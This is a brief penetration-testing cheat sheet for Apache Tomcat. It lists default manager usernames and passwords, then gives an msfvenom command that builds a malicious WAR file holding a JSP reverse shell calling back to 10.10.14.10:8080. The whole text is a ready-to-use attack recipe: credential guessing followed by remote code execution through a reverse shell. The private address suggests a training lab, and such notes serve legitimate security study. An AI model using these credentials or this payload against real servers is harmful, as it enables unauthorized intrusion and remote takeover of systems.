#### Default creds
```
admin : admin
ADMIN : ADMIN
admin : j5Brn9
admin : None
admin : tomcat
cxsdk : kdsxc
j2deployer : j2deployer
ovwebusr : OvW*busr1
QCC : QLogic66
role : changethis
role1 : role1
role1 : tomcat
root : root
tomcat : changethis
tomcat : s3cret
tomcat : tomcat
xampp : xampp
```

#### RCE
Upload malicious WAR file

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=8080 -f war > shell.war
```